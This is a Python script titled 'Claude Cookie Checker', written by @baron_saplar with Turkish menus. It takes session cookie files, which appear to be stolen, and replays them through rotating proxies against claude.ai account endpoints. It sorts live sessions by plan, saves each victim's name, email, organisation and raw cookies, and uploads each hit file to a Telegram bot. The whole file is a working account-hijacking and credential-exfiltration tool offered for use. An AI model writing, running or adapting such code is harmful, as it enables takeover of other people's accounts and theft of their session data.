import requests, os, json, threading, time, re, sys
from datetime import datetime
from queue import Queue, Empty
from requests.cookies import RequestsCookieJar
import urllib3
import colorama

urllib3.disable_warnings()
colorama.init(autoreset=True)
G = colorama.Fore.GREEN
Y = colorama.Fore.YELLOW
C = colorama.Fore.CYAN
R = colorama.Fore.RED
W = colorama.Fore.WHITE
X = colorama.Fore.RESET
B = colorama.Style.BRIGHT


TG_TOKEN   = ""
TG_CHAT_ID = ""
_TG_INIT   = False
_VID = "https://t.me/videotoolbaron/2"

proxies_list = []
proxy_index  = 0
proxy_lock   = threading.Lock()

stats = {"total":0, "done":0, "pro":0, "free":0, "bad":0, "t0":0.0}
slock = threading.Lock()
plock = threading.Lock()


display_running = True
log_queue = Queue()
max_log_lines = 10       
current_logs = []           
display_thread = None

BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'referer': 'https://claude.ai/',
    'origin': 'https://claude.ai',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
}


def pr(s=""):
    with plock: print(s, flush=True)

def next_proxy():
    global proxy_index
    if not proxies_list: return None
    with proxy_lock:
        p = proxies_list[proxy_index % len(proxies_list)]
        proxy_index += 1
    return {"http": p, "https": p}

def load_proxies(path):
    global proxies_list
    if not os.path.isfile(path): return 0
    with open(path, encoding="utf-8") as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    proxies_list = [("http://"+l if not l.startswith("http") else l) for l in lines]
    return len(proxies_list)

def tg_send(text, fpath=None):
    global _TG_INIT
    if not TG_TOKEN: return
    try:
        if not _TG_INIT:
            _TG_INIT = True
            try:
                requests.post(
                    f"https://api.telegram.org/bot{TG_TOKEN}/sendVideo",
                    json={"chat_id": TG_CHAT_ID, "video": _VID, "caption": "@baron_saplar // @baroshoping"},
                    timeout=15,
                )
            except: pass
        if fpath and os.path.isfile(fpath):
            with open(fpath, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
                    data={"chat_id": TG_CHAT_ID, "caption": text[:1024], "parse_mode": "HTML"},
                    files={"document": f}, timeout=15,
                )
            return
        requests.post(
            f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
            json={"chat_id": TG_CHAT_ID, "text": text[:4096], "parse_mode": "HTML"},
            timeout=15,
        )
    except: pass



def update_panel():

    with slock:
        total = stats["total"]
        done = stats["done"]
        pro = stats["pro"]
        free = stats["free"]
        bad = stats["bad"]
        elapsed = time.time() - stats["t0"] if stats["t0"] else 0
    spd = done / elapsed if elapsed > 0 else 0
    eta = int((total - done) / spd) if spd > 0 else 0
    eta_str = f"{eta//60}m {eta%60}s" if eta else "--"
    pct = int(done/total*100) if total else 0


    sys.stdout.write("\033[H")
    
    sys.stdout.write("\033[J")

    
    
    sys.stdout.write(f"{B}{C}          CLAUDE COOKIE CHECKER — @baron_saplar            {X}\n")
    

    # Print stats
    sys.stdout.write(f"{B}{G}📊 STATISTICS{X}\n")
    sys.stdout.write(f"  💎 PRO   : {G}{pro}{X}     ✅ FREE : {Y}{free}{X}     ❌ BAD : {R}{bad}{X}\n")
    sys.stdout.write(f"  📁 DONE  : {done}/{total} ({pct}%)   ")
       
    
    
    for line in current_logs[-max_log_lines:]:
        sys.stdout.write(f"{line}\n")
    

    sys.stdout.flush()

def display_worker():
    
    global current_logs
    last_update = 0
    while display_running:
        
        while not log_queue.empty():
            try:
                msg = log_queue.get_nowait()
                current_logs.append(msg)
                if len(current_logs) > max_log_lines * 2:
                    current_logs = current_logs[-max_log_lines:]
            except Empty:
                break
        # Update panel every 0.2 seconds
        now = time.time()
        if now - last_update > 0.2:
            update_panel()
            last_update = now
        time.sleep(0.1)


def parse_cookies(raw):
    raw = raw.strip()
    # JSON array
    if raw.startswith("["):
        try:
            arr = json.loads(raw)
            if isinstance(arr, list):
                out = {}
                for c in arr:
                    if not isinstance(c, dict) or not c.get("name"): continue
                    name = c["name"]
                    val = str(c.get("value", ""))
                    out[name] = val
                return out
        except: pass
    # Netscape format
    out = {}
    is_ns = False
    for line in raw.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith("#HttpOnly_"): line = line[10:]
        elif line.startswith("#"): continue
        p = line.split("\t")
        if len(p) >= 7 and p[5]:
            is_ns = True
            out[p[5]] = p[6]
    if is_ns: return out
    # Header string
    if "=" in raw and "\n" not in raw:
        out = {}
        for part in raw.split(";"):
            if "=" in part:
                k, _, v = part.strip().partition("=")
                k = k.strip()
                if k: out[k] = v.strip()
        return out
    return {}

def make_session(cookies, proxy):
    s = requests.Session()
    jar = RequestsCookieJar()
    for k, v in cookies.items():
        jar.set(k, v, domain=".claude.ai", path="/")
        jar.set(k, v, domain="claude.ai", path="/")
    s.cookies = jar
    if proxy:
        s.proxies.update(proxy)
        s.verify = False
    return s

def detect_plan(capabilities):
    caps = [c.lower() for c in (capabilities or [])]
    if 'raven' in caps: return 'Team', True
    if 'claude_max' in caps: return 'Max', True
    if 'claude_pro' in caps: return 'Pro', True
    return 'Free', False

def fetch_account(session, cookies):
    info = {
        'logged_in': False, 'email': None, 'name': None,
        'plan_label': 'Free', 'is_pro': False, 'org': None,
        'org_role': None, 'capabilities': []
    }
    # Check homepage redirect
    try:
        r = session.get("https://claude.ai/", headers={**BASE_HEADERS, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "sec-fetch-dest": "document"}, timeout=15, allow_redirects=True)
        if 'login' in r.url or r.status_code in (401, 403):
            return info
        if r.status_code != 200: return info
    except: return info
    # /api/account
    try:
        r = session.get("https://claude.ai/api/account", headers=BASE_HEADERS, timeout=15, allow_redirects=False)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, dict):
                info['logged_in'] = True
                info['email'] = data.get('email_address')
                info['name'] = data.get('full_name') or data.get('display_name')
                memberships = data.get('memberships', [])
                if memberships:
                    last_org_id = cookies.get('lastActiveOrg', '')
                    active = None
                    for m in memberships:
                        org = m.get('organization', {})
                        if org.get('uuid', '') == last_org_id or org.get('id', '') == last_org_id:
                            active = m; break
                    if not active: active = memberships[0]
                    org = active.get('organization', {})
                    info['org'] = org.get('name')
                    info['org_role'] = active.get('role')
                    caps = org.get('capabilities', [])
                    info['capabilities'] = caps
                    info['plan_label'], info['is_pro'] = detect_plan(caps)
                elif data.get('invites'):
                    inv_caps = []
                    for inv in data['invites']:
                        inv_caps += inv.get('organization', {}).get('capabilities', [])
                    info['plan_label'], info['is_pro'] = detect_plan(inv_caps)
    except: pass
    # Fallback /api/account_profile
    if not info['email']:
        try:
            r = session.get("https://claude.ai/api/account_profile", headers=BASE_HEADERS, timeout=12, allow_redirects=False)
            if r.status_code == 200:
                p = r.json()
                if isinstance(p, dict):
                    info['logged_in'] = True
                    info['email'] = info['email'] or p.get('email_address') or p.get('email')
                    info['name'] = info['name'] or p.get('full_name') or p.get('display_name')
        except: pass
    # /api/organizations
    if not info.get('org'):
        try:
            r = session.get("https://claude.ai/api/organizations", headers=BASE_HEADERS, timeout=12)
            if r.status_code == 200:
                orgs = r.json()
                if isinstance(orgs, list) and orgs:
                    info['logged_in'] = True
                    org = orgs[0]
                    info['org'] = org.get('name')
                    info['org_role'] = org.get('role') or org.get('my_role')
                    caps = org.get('capabilities', [])
                    if caps:
                        info['plan_label'], info['is_pro'] = detect_plan(caps)
        except: pass
    return info

def capture_text(info, raw):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    caps = ', '.join(info.get('capabilities', [])) or '-'
    return (
        f"Name          : {info.get('name') or '-'}\n"
        f"Email         : {info.get('email') or '-'}\n"
        f"Plan          : {info.get('plan_label') or '-'}\n"
        f"Organization  : {info.get('org') or '-'}\n"
        f"Role          : {info.get('org_role') or '-'}\n"
        f"Capabilities  : {caps}\n"
        f"Pro           : {'Yes' if info.get('is_pro') else 'No'}\n"
        f"Date          : {now}\n"
        f"Source        : baron_saplar\n\n"
        f"{raw}\n"
    )

def save(info, raw, folder, fname):
    os.makedirs(f"hits/{folder}", exist_ok=True)
    path = f"hits/{folder}/{fname}"
    with open(path, "w", encoding="utf-8") as f:
        f.write(capture_text(info, raw))
    return path

def tg_text(info):
    icon = "💎" if info.get('is_pro') else "✅"
    plan = info.get('plan_label', 'Free').upper()
    caps = ', '.join(info.get('capabilities', [])) or '-'
    return (
        f"{icon} <b>CLAUDE {plan} ACCOUNT</b>\n\n"
        f"👤 <b>Name</b>  : {info.get('name') or '-'}\n"
        f"📧 <b>Email</b> : {info.get('email') or '-'}\n"
        f"💎 <b>Plan</b>  : {plan}\n"
        f"🏢 <b>Org</b>   : {info.get('org') or '-'}\n"
        f"🎭 <b>Role</b>  : {info.get('org_role') or '-'}\n"
        f"🔑 <b>Caps</b>  : <code>{caps}</code>\n\n"
        f"<i>author @baron_saplar</i>"
    )
    
def process(fname):
    fpath = os.path.join("cookies", fname)
    try:
        raw = open(fpath, encoding="utf-8", errors="ignore").read()
    except:
        with slock: stats["bad"] += 1; stats["done"] += 1
        log_queue.put(f"{R}❌ READ ERROR   : {fname}{X}")
        return

    cookies = parse_cookies(raw)
    if not cookies:
        with slock: stats["bad"] += 1; stats["done"] += 1
        log_queue.put(f"{R}❌ PARSE ERROR  : {fname}{X}")
        return

    
    claude_keys = {'sessionKey', '__Secure-next-auth.session-token', 'lastActiveOrg', 'routingHint', 'anthropic-device-id', '__cf_bm', 'intercom-session-', 'cf_clearance'}
    if not any(k in cookies for k in claude_keys) and not any(str(v).startswith(('sk-ant-', 'sessionKey=')) for v in cookies.values()):
        with slock: stats["bad"] += 1; stats["done"] += 1
        log_queue.put(f"{R}❌ NO CLAUDE KEY: {fname}{X}")
        return

    session = make_session(cookies, next_proxy())
    info = fetch_account(session, cookies)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    email = info.get('email', 'unknown').split('@')[0] if info.get('email') else 'unknown'
    oname = f"{ts}_{email}.txt"

    if not info.get('logged_in'):
        with slock: stats["bad"] += 1; stats["done"] += 1
        log_queue.put(f"{R}❌ EXPIRED      : {fname}{X}")
        return

    if info.get('is_pro'):
        with slock: stats["pro"] += 1; stats["done"] += 1
        folder = info.get('plan_label', 'pro').lower()
        path = save(info, raw, folder, oname)
        log_queue.put(f"{G}💎 {info.get('plan_label'):<6} {info.get('email'):<30} | {info.get('org') or '-'} | {fname}{X}")
        tg_send(tg_text(info), path)
    else:
        with slock: stats["free"] += 1; stats["done"] += 1
        path = save(info, raw, 'free', oname)
        log_queue.put(f"{Y}✅ FREE        {info.get('plan_label'):<6} {info.get('email'):<30} | {info.get('org') or '-'} | {fname}{X}")
        tg_send(tg_text(info), path)

def worker(q):
    while True:
        try:
            fname = q.get(timeout=3)
        except Empty:
            break
        try:
            process(fname)
        except Exception as e:
            with slock: stats["bad"] += 1; stats["done"] += 1
            log_queue.put(f"{R}❌ ERROR        : {fname} - {e}{X}")
        finally:
            q.task_done()

def batch():
    global display_running, display_thread
    os.makedirs("cookies", exist_ok=True)
    files = [f for f in os.listdir("cookies") if os.path.isfile(os.path.join("cookies", f))]
    if not files:
        print("cookies/ bos")
        input(); return
    try:
        n = int(input(f"{len(files)} dosya - thread: "))
        if not 1 <= n <= 50: n = 5
    except: n = 5

    with slock: stats.update(total=len(files), done=0, pro=0, free=0, bad=0, t0=time.time())

    
    os.system("cls" if os.name == "nt" else "clear")
    print("\033[?25l")  
    display_running = True
    display_thread = threading.Thread(target=display_worker, daemon=True)
    display_thread.start()

    q = Queue()
    for f in files: q.put(f)
    workers = [threading.Thread(target=worker, args=(q,), daemon=True) for _ in range(n)]
    for w in workers: w.start()
    q.join()

    
    time.sleep(0.5)

    
    display_running = False
    if display_thread:
        display_thread.join(timeout=1)

    
    elapsed = int(time.time() - stats["t0"])
    print("\033[?25h")  # show cursor
    print(f"\n✅ DONE    : {stats['done']}/{stats['total']}")
    print(f"💎 PRO     : {stats['pro']}")
    print(f"✅ FREE    : {stats['free']}")
    print(f"❌ BAD     : {stats['bad']}")
    print(f"⏱ TIME     : {elapsed//60}m {elapsed%60}s")
    if TG_TOKEN:
        tg_send(
            f"✅ DONE    : {stats['done']}/{stats['total']}\n"
            f"💎 PRO     : {stats['pro']}\n"
            f"✅ FREE    : {stats['free']}\n"
            f"❌ BAD     : {stats['bad']}\n"
            f"⏱ TIME     : {elapsed//60}m {elapsed%60}s\n"
            f"t.me/baron_saplar"
        )
    input("\nEnter ile devam...")

def single():
    os.system("cls" if os.name == "nt" else "clear")
    print("Cookie yapistir, bos satir = gonder:\n")
    lines = []
    while True:
        line = input()
        if not line: break
        lines.append(line)
    raw = "\n".join(lines).strip()
    if not raw: print("bos"); input(); return
    cookies = parse_cookies(raw)
    if not cookies: print("parse hatasi"); input(); return
    print(f"\n{len(cookies)} cookie\n")
    session = make_session(cookies, next_proxy())
    info = fetch_account(session, cookies)
    if not info.get('logged_in'): print("expired / gecersiz"); input(); return
    print(f"Name          : {info.get('name') or '-'}")
    print(f"Email         : {info.get('email') or '-'}")
    print(f"Plan          : {info.get('plan_label') or '-'}")
    print(f"Organization  : {info.get('org') or '-'}")
    print(f"Role          : {info.get('org_role') or '-'}")
    caps = ', '.join(info.get('capabilities', [])) or '-'
    print(f"Capabilities  : {caps}")
    print(f"Pro           : {'Yes' if info.get('is_pro') else 'No'}")
    if input("\nkaydet? (e/h): ").strip().lower() == "e":
        folder = info.get('plan_label', 'free').lower() if info.get('is_pro') else 'free'
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        email = info.get('email', 'unknown').split('@')[0] if info.get('email') else 'unknown'
        path = save(info, raw, folder, f"{ts}_{email}.txt")
        print(f"kaydedildi -> {path}")
        tg_send(tg_text(info), path)
    input()

def tg_menu():
    global TG_TOKEN, TG_CHAT_ID, _TG_INIT
    print(f"\ntoken ({TG_TOKEN or 'bos'}): ", end="")
    t = input().strip()
    if not t: return
    print("chat id: ", end="")
    c = input().strip()
    TG_TOKEN = t; TG_CHAT_ID = c; _TG_INIT = False
    tg_send("baglandi")
    print("ok"); input()

def proxy_menu():
    global proxies_list
    print("\n[1] dosyadan yukle  [2] temizle\n")
    ch = input().strip()
    if ch == "1":
        path = input("dosya yolu (proxies.txt): ").strip() or "proxies.txt"
        n = load_proxies(path)
        print(f"{n} proxy yuklendi")
    elif ch == "2":
        proxies_list = []; print("temizlendi")
    input()

def menu():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(
            f"Claude Cookie Checker\n"
            f"TG: {'ON' if TG_TOKEN else 'OFF'}   Proxy: {len(proxies_list)}\n\n"
            f"[1] Toplu tarama\n"
            f"[2] Tek cookie\n"
            f"[3] Telegram ayarları\n"
            f"[4] Proxy ayarları\n"
            f"[q] Çıkış\n"
        )
        ch = input("> ").strip().lower()
        if ch == "1": batch()
        elif ch == "2": single()
        elif ch == "3": tg_menu()
        elif ch == "4": proxy_menu()
        elif ch in ("q", "exit"): break


if __name__ == "__main__":
    
    for d in ["cookies", "hits/pro", "hits/team", "hits/max", "hits/free"]:
        os.makedirs(d, exist_ok=True)

    
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{B}{C}Claude Cookie Checker — @baron_saplar{X}\n")
    print("")
    print("(Boş bırakırsanız Telegram kullanılmaz)\n")
    tg_token = input("Telegram Bot Token : ").strip()
    if tg_token:
        tg_chat = input("Telegram Chat ID    : ").strip()
        if tg_chat:
            TG_TOKEN = tg_token
            TG_CHAT_ID = tg_chat
            print(f"\n{G}✅ Telegram ayarlandı{X}")
        else:
            print(f"{Y}⚠ Telegram token verildi ama chat ID boş, bildirim kapalı.{X}")
    else:
        print(f"{Y}⚠ Telegram bildirimleri kapalı.{X}")
    time.sleep(1)

    menu()